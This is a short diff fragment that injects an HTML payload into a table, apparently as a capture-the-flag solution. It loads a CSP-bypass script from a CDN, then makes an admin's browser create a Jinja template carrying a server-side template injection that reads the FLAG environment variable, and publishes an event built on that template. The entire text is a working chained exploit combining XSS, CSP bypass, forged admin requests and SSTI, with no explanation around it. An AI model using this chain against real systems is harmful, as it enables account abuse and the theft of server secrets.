@@ -1,0 +1,4 @@
+</td></tr></tbody></table>
+<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script>
+<br csp="var t=new FormData();t.append('name','p');t.append('html_content',`{{lipsum.__globals__['os'].environ.get('FLAG')}}`);t.append('is_default','on');fetch('/admin/templates/create',{method:'POST',body:t}).then(r=>r.text()).then(h=>{var m=h.match(/templates\/(\d+)\/edit/);var id=m?m[1]:'2';var e=new FormData();e.append('name','flagev');e.append('date','2027-01-01');e.append('time','12:00');e.append('description','x');e.append('location','x');e.append('ticket_price','0');e.append('total_tickets','999');e.append('is_published','on');e.append('template_id',id);fetch('/admin/events/create',{method:'POST',body:e})})">
+<table><tbody><tr><td>
